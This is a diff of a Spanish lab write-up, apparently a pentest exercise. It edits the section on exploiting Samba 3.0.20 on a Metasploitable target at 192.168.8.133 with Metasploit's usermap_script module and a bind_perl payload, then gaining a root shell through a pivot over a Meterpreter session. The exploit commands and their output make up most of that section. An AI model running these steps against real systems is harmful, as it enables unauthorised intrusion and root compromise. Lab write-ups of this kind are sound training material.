@@ -939,78 +939,31 @@ run
 
 ### 6.1 Identificar Vulnerabilidad en Samba
 ```
-use auxiliary/scanner/smb/smb_version
+use exploit/multi/samba/usermap_script
 set RHOSTS 192.168.8.133
-run
+set PAYLOAD cmd/unix/bind_perl
+exploit
 ```
 
 **Resultado:**
 ```
 [*] 192.168.8.133:139     - Host could not be identified: Unix (Samba 3.0.20-Debian)
 ```
-Buscar exploit:**
-searchsploit samba 3.0.20
-```
-
-**Resultado:**
-```
-Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution (Metasploit)
-```
-
----
-
-### 6.2 Configurar Exploit
-```
-use exploit/multi/samba/usermap_script
-show options
-```
-
-**Configuración:**
-```
-set RHOSTS 192.168.8.133
-set PAYLOAD cmd/unix/bind_perl
-show options
-```
-
-**Verificar configuración:**
-```
-Module options (exploit/multi/samba/usermap_script):
-
-   Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS  192.168.8.133    yes       Target address
-   RPORT   139              yes       Target port
-
-Payload options (cmd/unix/bind_perl):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LPORT  4444             yes       Listener port
-   RHOST  192.168.8.133    yes       Target address
-```
-
----
-
-### 6.3 Ejecutar Exploit
-```
-exploit
-```
-
-**Resultado:**
-```
-[*] Started bind TCP handler against 192.168.8.133:4444
-[*] Command shell session 2 opened (192.168.8.131:40362 -> 192.168.8.133:4444 via session 1) at 2026-01-09 13:45:23 -0500
-```
-
-**✅ Shell obtenida en Metasploitable**
-
-**Nota:** `via session 1` indica que está usando la sesión Meterpreter como punto de pivote.
 
 ![Exploit Samba](img/samba1.jpg)
 
+
+
+**Resultado:**
+
+* Command shell session 2 opened (192.168.8.131:40362 -> 192.168.8.133:4444 via session 1)
+Ya tenemos acceso a Metasploitable a través del pivoting
+via session 1 → Está usando mi sesión Meterpreter en Ubuntu como puente
+192.168.8.131 (Ubuntu) → 192.168.8.133 (Metasploitable)
 ---
 
-### 6.4 Verificar Acceso
+### 6.2 Verificar acceso
+
 ```
 whoami
 ```
@@ -1035,7 +988,7 @@ uid=0(root) gid=0(root)
 
 ---
 
-### 6.5 Enumeración del Sistema
+### 6.3 Enumeración del Sistema
 
 **Hostname:**
 ```
